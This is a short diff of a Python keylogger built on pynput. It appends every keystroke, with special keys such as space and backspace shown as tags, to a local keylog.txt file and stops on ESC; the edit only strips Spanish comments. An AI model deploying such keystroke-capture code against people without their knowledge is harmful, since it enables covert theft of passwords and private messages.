@@ -2,11 +2,10 @@ from pynput import keyboard
 
 def on_press(key):
     try:
-        # Teclas normales (a-z, 0-9)
+        
         with open("keylog.txt", "a") as f:
             f.write(key.char)
     except AttributeError:
-        # Teclas especiales
         with open("keylog.txt", "a") as f:
             if key == keyboard.Key.space:
                 f.write(" ")
@@ -16,8 +15,7 @@ def on_press(key):
                 f.write("[BACKSPACE]")
             else:
                 f.write(f"[{key}]")
-    
-    # Detener con ESC
+ 
     if key == keyboard.Key.esc:
         return False
 
